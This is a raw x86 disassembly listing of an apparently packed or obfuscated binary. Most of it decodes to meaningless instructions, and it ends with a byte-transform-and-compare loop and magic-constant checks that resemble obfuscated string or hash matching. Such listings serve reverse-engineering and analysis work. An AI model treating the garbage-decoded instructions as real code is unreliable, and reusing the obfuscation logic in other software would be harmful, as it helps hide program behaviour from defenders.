  41a705:	in     eax,dx
  41a706:	test   dl,bh
  41a708:	mov    ah,0xe0
  41a70a:	mov    ebp,0xd980a833
  41a70f:	popf   
  41a710:	dec    ebx
  41a711:	(bad)  [edi]
  41a713:	mov    ebp,0x746b583
  41a718:	clc    
  41a719:	pop    ecx
  41a71a:	ficomp DWORD PTR [ebp-0x3b9874d6]
  41a720:	dec    ebx
  41a721:	gs push ebx
  41a723:	neg    eax
  41a725:	pop    ebp
  41a726:	outs   dx,BYTE PTR ds:[esi]
  41a727:	pop    esi
  41a728:	dec    esp
  41a729:	inc    edx
  41a72a:	push   es
  41a72b:	icebp  
  41a72c:	cwde   
  41a72d:	clc    
  41a72e:	(bad)  
  41a72f:	jmp    0x41a76d
  41a731:	mov    cl,0x59
  41a733:	mov    bp,0xb42a
  41a737:	test   eax,0x23e852d5
  41a73c:	and    BYTE PTR [eax],0xd5
  41a73f:	loope  0x41a718
  41a741:	mov    ds,ebp
  41a743:	xchg   esp,eax
  41a744:	sub    eax,0x770c0c64
  41a749:	dec    edi
  41a74a:	cli    
  41a74b:	pop    esp
  41a74c:	add    ah,BYTE PTR [ebx+ecx*1+0x3a6f1028]
  41a753:	mov    eax,0xf5cbbba5
  41a758:	loope  0x41a7b2
  41a75a:	imul   ecx,DWORD PTR [ebp+0x37597b50],0xffffffb5
  41a761:	clc    
  41a762:	out    dx,eax
  41a763:	jmp    0x41a70c
  41a765:	inc    eax
  41a766:	push   ebx
  41a767:	or     BYTE PTR [eax-0x58],dl
  41a76a:	jmp    0xc23ea672
  41a76f:	loope  0x41a7d5
  41a771:	mov    al,0x7d
  41a773:	or     eax,0xd2f4673d
  41a778:	dec    eax
  41a779:	les    ebp,FWORD PTR [esi]
  41a77b:	jns    0x41a707
  41a77d:	and    esi,edx
  41a77f:	out    dx,eax
  41a780:	xor    bh,ch
  41a782:	shl    DWORD PTR [edi],1
  41a784:	sbb    esi,ebx
  41a786:	jno    0x41a75e
  41a788:	sbb    DWORD PTR [ebp+0xf33abf9],esi
  41a78e:	pop    ebp
  41a78f:	push   ss
  41a790:	cmp    DWORD PTR [ecx+0x43a61d33],0xd
  41a797:	cmp    BYTE PTR [esi-0x47b31c9],0x9f
  41a79e:	in     al,dx
  41a79f:	daa    
  41a7a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7a1:	jnp    0x41a75d
  41a7a3:	mov    edi,0x8ad3f062
  41a7a8:	ret    0xfe0f
  41a7ab:	mov    ebp,0xf55d7c00
  41a7b0:	sub    ebx,DWORD PTR [edi-0x27841eff]
  41a7b6:	push   ds
  41a7b7:	mov    eax,0x5ac30d78
  41a7bc:	mov    cl,BYTE PTR [eax+0x3d32580e]
  41a7c2:	xchg   DWORD PTR [ecx],eax
  41a7c4:	test   eax,0x50da911c
  41a7c9:	jae    0x41a76b
  41a7cb:	pop    ds
  41a7cc:	mov    cl,0x3f
  41a7ce:	je     0x41a7f2
  41a7d0:	in     eax,dx
  41a7d1:	or     DWORD PTR [ebp+0x2fb7ade],0x3
  41a7d8:	inc    eax
  41a7d9:	clc    
  41a7da:	push   ebx
  41a7db:	push   ecx
  41a7dc:	mov    dh,0x46
  41a7de:	cs jbe 0x41a7ca
  41a7e1:	mov    DWORD PTR [eax+0x13],ebx
  41a7e4:	jecxz  0x41a7b2
  41a7e6:	sbb    al,0xaa
  41a7e8:	test   DWORD PTR [edi+0x31],eax
  41a7eb:	jge    0x41a77a
  41a7ed:	or     eax,DWORD PTR [eax+esi*2]
  41a7f0:	mov    ds:0x73233d46,al
  41a7f5:	jno    0x41a79a
  41a7f7:	cli    
  41a7f8:	cmp    esp,esi
  41a7fa:	test   al,0x1
  41a7fc:	cdq    
  41a7fd:	xchg   ebp,eax
  41a7fe:	fcmove st,st(1)
  41a800:	inc    eax
  41a801:	push   ss
  41a802:	out    dx,eax
  41a803:	in     eax,0xd7
  41a805:	aas    
  41a806:	mov    dl,0xbd
  41a808:	mov    ds:0xdc8ac0eb,al
  41a80d:	or     ah,BYTE PTR [ecx]
  41a80f:	sbb    esp,0xfffffff8
  41a812:	(bad)  
  41a813:	in     eax,dx
  41a814:	inc    edi
  41a815:	rol    esp,cl
  41a817:	xchg   esi,eax
  41a818:	imul   esi,DWORD PTR [edx-0x4aee8f10],0x80b60f0b
  41a822:	push   ebp
  41a823:	jb     0x41a848
  41a825:	sbb    BYTE PTR [esi-0x5a0ef881],bh
  41a82b:	cs nop
  41a82d:	cmp    DWORD PTR [edi],esp
  41a82f:	jmp    0x41a815
  41a831:	xor    al,0x2
  41a833:	inc    ebp
  41a834:	cmp    esi,ebx
  41a836:	and    al,0x55
  41a838:	xor    eax,0x941dcbe0
  41a83d:	mov    cl,0xb
  41a83f:	retf   
  41a840:	lods   al,BYTE PTR ds:[esi]
  41a841:	mov    BYTE PTR [ebp*8+0x787980c3],bl
  41a848:	(bad)  
  41a849:	mov    bh,0xb6
  41a84b:	push   cs
  41a84c:	out    dx,al
  41a84d:	mov    ebx,DWORD PTR [esi]
  41a84f:	xor    DWORD PTR [eax],ecx
  41a851:	push   edi
  41a852:	mul    DWORD PTR [ebp-0x3ef9f3ef]
  41a858:	adc    BYTE PTR [edx],al
  41a85a:	ins    BYTE PTR es:[edi],dx
  41a85b:	cli    
  41a85c:	mov    esi,0xd91df6c3
  41a861:	inc    ebp
  41a862:	retf   
  41a863:	mov    esp,0xaa047012
  41a868:	das    
  41a869:	sub    al,0x78
  41a86b:	sbb    DWORD PTR [eax-0x35],eax
  41a86e:	cdq    
  41a86f:	cmp    eax,0x2ec5957a
  41a874:	mov    esp,DWORD PTR [esi-0x4a]
  41a877:	mov    edx,0x2b89d760
  41a87c:	ret    
  41a87d:	mov    ah,0x13
  41a87f:	ja     0x41a89f
  41a881:	adc    al,0xa0
  41a883:	sahf   
  41a884:	inc    edi
  41a885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a886:	data16 je 0x41a881
  41a889:	rcr    DWORD PTR [edi],0xb1
  41a88c:	push   edi
  41a88d:	mov    ch,al
  41a88f:	and    eax,0xe36ae976
  41a894:	mov    al,0x7a
  41a896:	pop    es
  41a897:	mov    ds:0xfbbbe5f4,al
  41a89c:	xor    ch,BYTE PTR fs:[edx+0x7526dba6]
  41a8a3:	scas   al,BYTE PTR es:[edi]
  41a8a4:	leave  
  41a8a5:	and    ecx,DWORD PTR [eax+0x33]
  41a8a8:	cmp    BYTE PTR [edi-0xd2fbdf9],0x5b
  41a8af:	jb     0x41a833
  41a8b1:	xor    DWORD PTR [ebx-0x10],edx
  41a8b4:	push   ss
  41a8b5:	push   edx
  41a8b6:	out    dx,eax
  41a8b7:	and    bh,BYTE PTR [edi+0x6c54a3c3]
  41a8bd:	add    al,0xd6
  41a8bf:	test   eax,0x1a0949fd
  41a8c4:	mov    ebp,0x66acb98a
  41a8c9:	lahf   
  41a8ca:	sub    cl,BYTE PTR [ecx+0x1]
  41a8cd:	in     al,dx
  41a8ce:	(bad)  
  41a8cf:	imul   DWORD PTR [eax+edi*1-0x6]
  41a8d3:	test   BYTE PTR [edi+0x65],0x44
  41a8d7:	sahf   
  41a8d8:	xchg   ebp,eax
  41a8d9:	aad    0xb9
  41a8db:	call   0x1525:0x8ed44a28
  41a8e2:	test   esp,edx
  41a8e4:	pop    es
  41a8e5:	outs   dx,BYTE PTR ds:[esi]
  41a8e6:	retf   0xe086
  41a8e9:	fisub  DWORD PTR [edi]
  41a8eb:	bound  esi,QWORD PTR [ecx]
  41a8ed:	xchg   ebx,eax
  41a8ee:	push   ecx
  41a8ef:	xchg   BYTE PTR [ebp-0x2e97e48d],dl
  41a8f5:	cwde   
  41a8f6:	dec    ebp
  41a8f7:	int3   
  41a8f8:	or     BYTE PTR [esp+eiz*2+0x10db835d],dl
  41a8ff:	jmp    0xae202c6c
  41a904:	mov    esp,0x21f09553
  41a909:	rol    cl,cl
  41a90b:	hlt    
  41a90c:	pop    eax
  41a90d:	mov    edi,0xb5e3683
  41a912:	push   0x14
  41a914:	sbb    BYTE PTR [edi],cl
  41a916:	jmp    0x41a97a
  41a918:	popa   
  41a919:	mov    esi,0x44523c3a
  41a91e:	adc    bl,BYTE PTR [ebx]
  41a920:	and    bh,BYTE PTR [esi]
  41a922:	pop    ss
  41a923:	leave  
  41a924:	fimul  DWORD PTR [edx-0x5b]
  41a927:	add    al,bl
  41a929:	scas   al,BYTE PTR es:[edi]
  41a92a:	or     eax,0x991fefc4
  41a92f:	sub    DWORD PTR [si-0x7e],ebp
  41a933:	fld    DWORD PTR [ecx+0x31]
  41a936:	push   edx
  41a937:	rcr    DWORD PTR [edx],1
  41a939:	xor    al,0xa5
  41a93b:	je     0x41a8d5
  41a93d:	std    
  41a93e:	mov    es,esi
  41a940:	cld    
  41a941:	pop    es
  41a942:	loopne 0x41a9af
  41a944:	scas   eax,DWORD PTR es:[edi]
  41a945:	mov    ch,0x54
  41a947:	int    0xb3
  41a949:	nop
  41a94a:	cmp    esi,DWORD PTR [eax+0x5ee9bf4]
  41a950:	xchg   esp,eax
  41a951:	ins    DWORD PTR es:[edi],dx
  41a952:	sbb    al,0x83
  41a954:	loop   0x41a9c8
  41a956:	mov    eax,ds:0x8890e01f
  41a95b:	sbb    esi,DWORD PTR [edi]
  41a95d:	jmp    0xa53127bc
  41a962:	lods   eax,DWORD PTR ds:[esi]
  41a963:	mov    dl,BYTE PTR [edx-0x74]
  41a966:	mov    ?,WORD PTR [edi]
  41a968:	out    0x6f,al
  41a96a:	xchg   ebp,esi
  41a96c:	rol    al,0x81
  41a96f:	mov    bl,0xd0
  41a971:	sti    
  41a972:	gs xchg edx,eax
  41a974:	jne    0x41a920
  41a976:	ins    BYTE PTR es:[edi],dx
  41a977:	aad    0x3a
  41a979:	icebp  
  41a97a:	adc    edx,DWORD PTR [eax-0x28ec61a2]
  41a980:	ds test dl,ah
  41a983:	pushf  
  41a984:	pop    ebx
  41a985:	dec    ebp
  41a986:	shr    DWORD PTR [ebp-0x39],1
  41a989:	cs mov ch,0x47
  41a98c:	sahf   
  41a98d:	call   0x9cba:0x5ce6343d
  41a994:	(bad)  
  41a995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a996:	inc    esi
  41a997:	push   es
  41a998:	jp     0x41a9c4
  41a99a:	ss sbb eax,0xc9dd2cf1
  41a9a0:	mov    edx,0xc569dc53
  41a9a5:	and    al,BYTE PTR [ecx+ebx*4]
  41a9a8:	sbb    al,0x32
  41a9aa:	test   BYTE PTR [esi],dh
  41a9ac:	pop    ds
  41a9ad:	push   0x594777af
  41a9b2:	enter  0x15c6,0xb1
  41a9b6:	ds fmul st,st(5)
  41a9b9:	sbb    ch,dl
  41a9bb:	mov    ah,0xcd
  41a9bd:	jbe    0x41a948
  41a9bf:	(bad)  
  41a9c0:	gs hlt 
  41a9c2:	aam    0xcc
  41a9c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9c5:	pop    ebx
  41a9c6:	fs repz sahf 
  41a9c9:	data16 (bad) 
  41a9cc:	adc    ecx,0xeb4834da
  41a9d2:	xchg   DWORD PTR [ecx+0x78],edi
  41a9d5:	push   edi
  41a9d6:	or     eax,0xabebccf0
  41a9db:	sub    bl,bl
  41a9dd:	mov    bh,0x17
  41a9df:	sub    DWORD PTR [ecx+eiz*4],eax
  41a9e2:	out    dx,eax
  41a9e3:	hlt    
  41a9e4:	js     0x41a979
  41a9e6:	inc    esi
  41a9e7:	call   0xd27d40c2
  41a9ec:	cmp    al,0x2c
  41a9ee:	sbb    BYTE PTR [edi],ah
  41a9f0:	pop    ecx
  41a9f1:	rcl    esi,cl
  41a9f3:	jbe    0x41a97b
  41a9f5:	jmp    0x41aa25
  41a9f7:	xlat   BYTE PTR ds:[ebx]
  41a9f8:	and    BYTE PTR [ebp+0x263cfa40],0x6c
  41a9ff:	cmp    DWORD PTR [eax+edx*2+0x2ac542a7],esp
  41aa06:	fidiv  WORD PTR [edi]
  41aa08:	jne    0x41aa1b
  41aa0a:	jne    0x41a9dc
  41aa0c:	jne    0x41a9b9
  41aa0e:	jbe    0x41aa87
  41aa10:	nop
  41aa11:	icebp  
  41aa12:	lahf   
  41aa13:	ja     0x41aa49
  41aa15:	and    al,0x5a
  41aa17:	inc    ebx
  41aa18:	outs   dx,DWORD PTR ds:[esi]
  41aa19:	add    DWORD PTR [ecx],ebp
  41aa1b:	ins    DWORD PTR es:[di],dx
  41aa1d:	mov    DWORD PTR [eax+0x24],esp
  41aa20:	or     cl,dh
  41aa22:	fidiv  WORD PTR [edx]
  41aa24:	mul    BYTE PTR es:[edx+0x1b]
  41aa28:	push   ss
  41aa29:	arpl   WORD PTR [ecx+eiz*2-0x5a],dx
  41aa2d:	jl     0x41a9cd
  41aa2f:	mov    ds:0x9ba301cb,eax
  41aa34:	enter  0x1b24,0x20
  41aa38:	pop    ds
  41aa39:	adc    DWORD PTR [esi+0x21536b8d],0x51289c60
  41aa43:	test   eax,0xfcdadd03
  41aa48:	ja     0x41a9d0
  41aa4a:	adc    ebp,DWORD PTR [edi]
  41aa4c:	shl    DWORD PTR [edx+eiz*4],0x20
  41aa50:	mov    eax,0x303a2cde
  41aa55:	adc    BYTE PTR [esi-0x36],bl
  41aa58:	mov    ?,edx
  41aa5a:	sub    BYTE PTR [esi+0x65],ch
  41aa5d:	push   0x39
  41aa5f:	(bad)  
  41aa60:	xchg   edx,eax
  41aa61:	pop    ds
  41aa62:	jns    0x41aa24
  41aa64:	cmp    BYTE PTR [esp+ebx*1-0x6b28638a],0x6c
  41aa6c:	loope  0x41aa18
  41aa6e:	mov    ah,0xe6
  41aa70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa71:	and    DWORD PTR [ecx],edx
  41aa73:	es push eax
  41aa75:	pop    esi
  41aa76:	shr    BYTE PTR [ebx+ebx*4+0x5e],cl
  41aa7a:	pusha  
  41aa7b:	xor    eax,0xda7bf312
  41aa80:	loopne 0x41aa15
  41aa82:	mov    gs,esi
  41aa84:	or     eax,DWORD PTR [eax]
  41aa86:	or     ch,BYTE PTR [edi-0x7dc64fae]
  41aa8c:	sbb    BYTE PTR [eax-0x9de4bca],bl
  41aa92:	jb     0x41aaa1
  41aa94:	pop    ds
  41aa95:	mov    bh,0xaf
  41aa97:	std    
  41aa98:	test   BYTE PTR [ebx-0x11],dh
  41aa9b:	jns    0x41aafc
  41aa9d:	mov    cl,0xeb
  41aa9f:	jo     0x41aaa6
  41aaa1:	adc    DWORD PTR ss:[esp+ecx*2+0x54b96dea],ecx
  41aaa9:	pop    ecx
  41aaaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaab:	or     BYTE PTR [eax+0x3a],cl
  41aaae:	fld    TBYTE PTR [esi]
  41aab0:	jno    0x41aaa2
  41aab2:	add    ebx,DWORD PTR [ebp-0x1ff4d364]
  41aab8:	xor    al,ch
  41aaba:	test   BYTE PTR [ebx],0xf7
  41aabd:	pop    esi
  41aabe:	mov    edx,0x36867938
  41aac3:	dec    ecx
  41aac4:	jl     0x41aacc
  41aac6:	cli    
  41aac7:	test   eax,0xea471a80
  41aacc:	xchg   edx,eax
  41aacd:	or     eax,0xd8916a55
  41aad2:	sbb    al,0xb0
  41aad4:	ror    BYTE PTR [ebx+0x6024524f],0x51
  41aadb:	ja     0x41ab02
  41aadd:	cmp    eax,0x6f4cc621
  41aae2:	adc    DWORD PTR [ebx-0xb2e9114],edx
  41aae8:	mov    edi,0x2e4ec983
  41aaed:	sti    
  41aaee:	sub    BYTE PTR [ebx+0x395e2716],bl
  41aaf4:	inc    ebx
  41aaf5:	sub    ebp,DWORD PTR [ecx]
  41aaf7:	cmp    al,dl
  41aaf9:	and    eax,0x83b3b8ec
  41aafe:	sub    DWORD PTR [ebp+0x45],0xffffffa7
  41ab02:	shl    BYTE PTR [ebp+0xf],1
  41ab05:	xor    eax,0xc1ba96c6
  41ab0a:	and    esi,ebp
  41ab0c:	mov    eax,ds:0x3c780cfe
  41ab11:	sbb    eax,0x31e1c033
  41ab16:	lahf   
  41ab17:	shl    DWORD PTR [ebp-0x18f25afa],cl
  41ab1d:	add    dh,bl
  41ab1f:	adc    bh,ch
  41ab21:	jecxz  0x41aabf
  41ab23:	les    esp,FWORD PTR [edx]
  41ab25:	scas   al,BYTE PTR es:[edi]
  41ab26:	in     al,dx
  41ab27:	repnz push edx
  41ab29:	adc    eax,0x85d3d305
  41ab2e:	xchg   ebp,eax
  41ab2f:	outs   dx,BYTE PTR ds:[esi]
  41ab30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab31:	pop    ds
  41ab32:	mov    esp,0xd6495f83
  41ab37:	cmp    eax,DWORD PTR [ebx-0x644ab711]
  41ab3d:	stos   BYTE PTR es:[edi],al
  41ab3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab3f:	popa   
  41ab40:	and    eax,0xe83f770
  41ab45:	fucomip st,st(6)
  41ab47:	or     BYTE PTR [edi-0x11],dl
  41ab4a:	aaa    
  41ab4b:	lock add esi,DWORD PTR [ebx]
  41ab4e:	lea    edx,[edi]
  41ab50:	test   eax,0xce22bc76
  41ab55:	gs jle 0x41ab5c
  41ab58:	pop    esp
  41ab59:	and    al,0x1f
  41ab5b:	into   
  41ab5c:	(bad)  
  41ab5d:	adc    BYTE PTR [edi+0x40],ch
  41ab60:	mov    al,0x5d
  41ab62:	lods   eax,DWORD PTR ds:[esi]
  41ab63:	shl    DWORD PTR [eax+0x4c],1
  41ab66:	push   esp
  41ab67:	mov    ?,WORD PTR [ecx+0x71]
  41ab6a:	test   al,0x4f
  41ab6c:	inc    ecx
  41ab6d:	out    0x64,eax
  41ab6f:	adc    al,0x8
  41ab71:	lahf   
  41ab72:	neg    DWORD PTR [ebp+0x219c6226]
  41ab78:	mov    al,0xa8
  41ab7a:	mov    eax,ds:0x9f09dde9
  41ab7f:	jl     0x41abba
  41ab81:	mov    al,ds:0x3077d492
  41ab86:	push   eax
  41ab87:	ins    DWORD PTR es:[edi],dx
  41ab88:	in     al,dx
  41ab89:	inc    esi
  41ab8a:	sbb    bl,BYTE PTR [esi-0x8]
  41ab8d:	(bad)  
  41ab8e:	xor    ebp,ecx
  41ab90:	retf   
  41ab91:	sbb    al,BYTE PTR [ecx-0x32]
  41ab94:	nop
  41ab95:	jnp    0x41ab3c
  41ab97:	sub    ebx,0x2ee01390
  41ab9d:	dec    eax
  41ab9e:	sti    
  41ab9f:	cmp    eax,DWORD PTR [ebp+0x5]
  41aba2:	inc    ebp
  41aba3:	jl     0x41abad
  41aba5:	ja     0x41abbf
  41aba7:	arpl   cx,bx
  41aba9:	daa    
  41abaa:	mov    al,ds:0x8f693c04
  41abaf:	int    0x3e
  41abb1:	adc    BYTE PTR [ecx+0x4dbf0079],cl
  41abb7:	mov    eax,ds:0x14c2a53d
  41abbc:	repnz pop es
  41abbe:	outs   dx,DWORD PTR ds:[esi]
  41abbf:	jecxz  0x41ac2f
  41abc1:	sbb    al,0xb5
  41abc3:	lods   eax,DWORD PTR ds:[esi]
  41abc4:	sbb    eax,0xde59f84
  41abc9:	stc    
  41abca:	aas    
  41abcb:	fsubr  st,st(1)
  41abcd:	or     BYTE PTR [edi*4+0x77cb2d5],dh
  41abd4:	pop    edx
  41abd5:	inc    BYTE PTR [ebp-0x72]
  41abd8:	push   esi
  41abd9:	jle    0x41ab9c
  41abdb:	call   0xf2e41194
  41abe0:	mov    bl,0x21
  41abe2:	push   ecx
  41abe3:	cmp    eax,0x5141a7b2
  41abe8:	sbb    al,0xdb
  41abea:	jns    0x41abcb
  41abec:	int    0x7d
  41abee:	dec    ecx
  41abef:	out    dx,eax
  41abf0:	and    BYTE PTR [esi+0x2d],bl
  41abf3:	gs pop ebp
  41abf5:	enter  0x6699,0xba
  41abf9:	mov    bl,0x1e
  41abfb:	iret   
  41abfc:	sbb    DWORD PTR [edx+0x759d7d55],0xb7286665
  41ac06:	out    0x9a,eax
  41ac08:	nop
  41ac09:	and    al,BYTE PTR [edx]
  41ac0b:	lds    ebx,FWORD PTR [eax]
  41ac0d:	scas   eax,DWORD PTR es:[edi]
  41ac0e:	shl    DWORD PTR [edi],cl
  41ac10:	mov    ss,WORD PTR [edi-0x3a]
  41ac13:	out    0x69,al
  41ac15:	adc    dh,bl
  41ac17:	aaa    
  41ac18:	cmp    al,0xae
  41ac1a:	popa   
  41ac1b:	arpl   WORD PTR [edi-0x1858d4e],dx
  41ac21:	push   edi
  41ac23:	stc    
  41ac24:	arpl   di,cx
  41ac26:	das    
  41ac27:	sbb    eax,0xd22952a8
  41ac2c:	hlt    
  41ac2d:	xor    DWORD PTR [ebx-0x54],0x49
  41ac31:	mov    ds:0x59ca30f4,al
  41ac36:	aam    0x28
  41ac38:	push   esi
  41ac39:	test   al,0xbe
  41ac3b:	cmp    eax,0xed297906
  41ac40:	(bad)  
  41ac41:	xor    DWORD PTR [edx+0x25759ef5],ecx
  41ac47:	add    BYTE PTR [eax-0x79b1f773],bl
  41ac4d:	push   ebp
  41ac4e:	sti    
  41ac4f:	jnp    0x41ac3d
  41ac51:	push   ebp
  41ac52:	aad    0x12
  41ac54:	add    DWORD PTR [edx],0x9b3bf5ab
  41ac5a:	out    0x22,eax
  41ac5c:	arpl   bx,di
  41ac5e:	imul   ebp,DWORD PTR [edx-0x37],0x6a0c895d
  41ac65:	stos   DWORD PTR es:[edi],eax
  41ac66:	rcr    DWORD PTR [ecx],cl
  41ac68:	ss in  eax,dx
  41ac6a:	adc    eax,esi
  41ac6c:	mov    ebx,0x7f48e20e
  41ac71:	dec    eax
  41ac72:	scas   eax,DWORD PTR es:[edi]
  41ac73:	push   ds
  41ac74:	push   ds
  41ac75:	out    dx,eax
  41ac76:	arpl   WORD PTR [edi+esi*2+0xb],cx
  41ac7a:	loopne 0x41ac0c
  41ac7c:	pop    esi
  41ac7d:	mov    ebx,0xcf97b57
  41ac82:	fldcw  WORD PTR [ebx-0x1851a943]
  41ac88:	jo     0x41ac98
  41ac8a:	popf   
  41ac8b:	std    
  41ac8c:	sub    al,0x42
  41ac8e:	(bad)  
  41ac8f:	or     BYTE PTR [ecx+0x68],dh
  41ac92:	dec    eax
  41ac93:	pop    es
  41ac94:	dec    ecx
  41ac95:	ja     0x41ac9e
  41ac97:	je     0x41acc0
  41ac99:	adc    DWORD PTR [eax+edi*4-0x61],0x4898ea
  41aca1:	in     eax,0xe7
  41aca3:	adc    BYTE PTR [esi-0x113f7bdf],bl
  41aca9:	cmp    edi,edi
  41acab:	cld    
  41acac:	(bad)  
  41acad:	nop
  41acae:	mov    ss,WORD PTR [ebp+0x60]
  41acb1:	enter  0x5ad1,0x1b
  41acb5:	loopne 0x41ad03
  41acb7:	jp     0x41acaa
  41acb9:	and    ch,BYTE PTR [ecx-0x3c301b05]
  41acbf:	add    DWORD PTR ds:0x666a8f9b,esp
  41acc5:	repz out 0xe0,eax
  41acc8:	ds push ecx
  41acca:	mov    edi,0xecbeb96b
  41accf:	mov    esi,0xb89c8ac0
  41acd4:	stos   BYTE PTR es:[edi],al
  41acd5:	loop   0x41ad42
  41acd7:	pop    edi
  41acd8:	xor    eax,0x70233084
  41acdd:	aam    0x93
  41acdf:	ja     0x41ac6b
  41ace1:	xor    ah,BYTE PTR [ebp+0xe3f763]
  41ace7:	fst    QWORD PTR [edx+0x19]
  41acea:	and    esi,DWORD PTR [edx-0x608e137d]
  41acf0:	or     DWORD PTR [esi-0x36],edx
  41acf3:	sub    al,0x9b
  41acf5:	jo     0x41ad6b
  41acf7:	sub    BYTE PTR [ebp-0x4994eb4e],dh
  41acfd:	mov    esi,0xaa7ce652
  41ad02:	cmp    eax,0xe2054721
  41ad07:	and    eax,0xe89dd052
  41ad0c:	imul   edi,ebp,0xffffff8c
  41ad0f:	(bad)  
  41ad10:	fiadd  WORD PTR [edx+ecx*8]
  41ad13:	and    esi,DWORD PTR [ebx]
  41ad15:	xchg   ecx,eax
  41ad16:	lahf   
  41ad17:	int    0xf2
  41ad19:	mov    bh,0xa2
  41ad1b:	and    edi,DWORD PTR [ebx]
  41ad1d:	adc    DWORD PTR [eax-0x14],eax
  41ad20:	pop    ds
  41ad21:	and    ah,BYTE PTR [edi+0x346804f5]
  41ad27:	mov    ch,0x2e
  41ad29:	jmpw   0x636e
  41ad2d:	push   edx
  41ad2e:	push   ds
  41ad2f:	push   0x4b7518ed
  41ad34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad35:	sbb    BYTE PTR [edi-0xe],ch
  41ad38:	cmp    al,0x67
  41ad3a:	fist   WORD PTR [ebx+0x12828435]
  41ad40:	cwde   
  41ad41:	mov    ah,BYTE PTR [ebx]
  41ad43:	into   
  41ad44:	jns    0x41ad6f
  41ad46:	xlat   BYTE PTR ds:[ebx]
  41ad47:	mov    ebp,DWORD PTR [edi-0x41]
  41ad4a:	xor    esi,esi
  41ad4c:	lods   eax,DWORD PTR ds:[esi]
  41ad4d:	inc    esp
  41ad4e:	jmp    DWORD PTR [eax+0x77]
  41ad51:	add    BYTE PTR [ebp+0x4f],ah
  41ad54:	or     cl,cl
  41ad56:	xchg   edx,eax
  41ad57:	xor    bh,BYTE PTR [bx+di+0x2f9]
  41ad5c:	test   eax,0xaf1e0ad8
  41ad61:	int3   
  41ad62:	jb     0x41ad31
  41ad64:	dec    ebp
  41ad65:	mov    esi,0xb7d5dbc4
  41ad6a:	mov    dh,0xa5
  41ad6c:	lds    esi,FWORD PTR [eax-0x4c660533]
  41ad72:	pop    es
  41ad73:	pushf  
  41ad74:	jl     0x41acf6
  41ad76:	mov    esp,0xceddf98f
  41ad7b:	(bad)  
  41ad7c:	fnstcw WORD PTR [ebx]
  41ad7e:	pop    ss
  41ad7f:	push   ebx
  41ad80:	lock mov esp,0x628615e9
  41ad86:	sub    bl,BYTE PTR [ecx+0x76]
  41ad89:	jae    0x41adf1
  41ad8b:	or     eax,0x784c7a4f
  41ad90:	adc    ah,cl
  41ad92:	inc    esp
  41ad93:	sbb    eax,0x43a45726
  41ad98:	cmp    BYTE PTR [ebp-0x5d],bl
  41ad9b:	lods   al,BYTE PTR ds:[esi]
  41ad9c:	mov    ds:0x44aa3a0c,eax
  41ada1:	(bad)  
  41ada2:	jne    0x41ad73
  41ada4:	gs lahf 
  41ada6:	jnp    0x41ad5e
  41ada8:	out    dx,al
  41ada9:	or     esp,DWORD PTR [eax]
  41adab:	aas    
  41adac:	inc    esi
  41adad:	jp     0x41adf0
  41adaf:	jae    0x41adf2
  41adb1:	pusha  
  41adb2:	popf   
  41adb3:	xor    BYTE PTR [edi],ch
  41adb5:	push   0xb8040eab
  41adba:	out    dx,eax
  41adbb:	dec    edx
  41adbc:	retf   
  41adbd:	stos   BYTE PTR es:[edi],al
  41adbe:	call   0x3162:0x92a2f512
  41adc5:	xchg   esp,eax
  41adc6:	jne    0x41adcb
  41adc8:	es lahf 
  41adca:	sub    dl,0xf0
  41adcd:	jecxz  0x41ae3b
  41adcf:	pop    edi
  41add0:	dec    edx
  41add1:	adc    dl,BYTE PTR [eax+0x5b]
  41add4:	shl    DWORD PTR [eax+0x75],cl
  41add7:	bound  ebx,QWORD PTR [edx-0x30]
  41adda:	hlt    
  41addb:	out    0xe,al
  41addd:	jle    0x41ae2c
  41addf:	js     0x41ae32
  41ade1:	icebp  
  41ade2:	pop    eax
  41ade3:	pop    ecx
  41ade4:	adc    al,0x11
  41ade6:	out    dx,eax
  41ade7:	pop    ss
  41ade8:	outs   dx,DWORD PTR ds:[esi]
  41ade9:	int3   
  41adea:	xchg   edx,eax
  41adeb:	loope  0x41ad76
  41aded:	inc    ebp
  41adee:	clc    
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c66
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
